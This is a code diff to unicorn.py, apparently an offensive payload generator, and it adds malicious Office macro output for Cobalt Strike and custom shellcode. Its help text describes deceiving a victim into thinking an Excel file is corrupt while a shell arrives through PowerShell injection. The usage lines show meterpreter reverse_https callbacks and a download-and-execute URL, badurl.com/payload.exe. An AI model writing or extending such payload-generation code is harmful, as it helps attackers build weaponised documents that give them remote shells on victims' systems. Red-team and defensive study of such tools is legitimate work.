@@ -122,8 +122,8 @@ is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! 
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
-""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
-the output from: Sub Auto_Open()
+""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need 
+to modify the first line of the output from: Sub Auto_Open()
  
 To: Sub AutoOpen()
  
@@ -375,7 +375,11 @@ def gen_usage():
     print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
     print("PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe")
     print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
+    print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
+    print("Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro")
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
+    print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
+    print("HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta")
     print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
@@ -721,6 +725,14 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             cobalt_strike()
             hta_help()
             print("[*] Exported the custom hta_attack vector to hta_attacks/. This folder contains everything you need for CS or your custom shellcode. Enjoy!\n")
+
+
+        elif attack_modifier == "macro":
+            macro_attack = generate_macro(full_attack)
+            write_file("powershell_attack.txt", macro_attack)
+            cobalt_strike()
+            macro_help()
+
         else:
             write_file("powershell_attack.txt", full_attack)
             cobalt_strike()
@@ -733,6 +745,13 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             custom_shellcode()
             hta_help()
             print("[*] Exported the hta attack vector to hta_attacks/. This folder contains everything you need. Enjoy!\n")
+
+        elif attack_modifier == "macro":
+            macro_attack = generate_macro(full_attack)
+            write_file("powershell_attack.txt", macro_attack)
+            custom_shellcode()
+            macro_help()
+
         else:
             write_file("powershell_attack.txt", full_attack)
             custom_shellcode()
@@ -786,8 +805,9 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         if attack_type != "cs":
             if attack_type != "shellcode":
                 if attack_modifier != "hta":
-                   write_file("powershell_attack.txt", full_attack)
-                   ps_help()
+                    if attack_modifier != "macro":
+                       write_file("powershell_attack.txt", full_attack)
+                       ps_help()
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
@@ -844,8 +864,13 @@ try:
 
             elif sys.argv[2] == "cs":
                 attack_type = "cs"
+                # using hta attack within custom shellcode or cobalt strike
                 if "hta" in sys.argv: 
                     attack_modifier = "hta"
+
+                # using macro attack within custom shellcode or co balt strike
+                if "macro" in sys.argv:
+                    attack_modifier = "macro"
 
             elif sys.argv[2] == "shellcode":
                 attack_type = "shellcode"
@@ -887,7 +912,8 @@ try:
         port = "cobaltstrike"
         ps = gen_shellcode_attack(payload, ipaddr, port)
         if attack_modifier != "hta":
-            attack_modifier = ("cs")
+            if attack_modifier != "macro":
+                attack_modifier = ("cs")
 
         format_payload(ps, attack_type, attack_modifier, None)
 
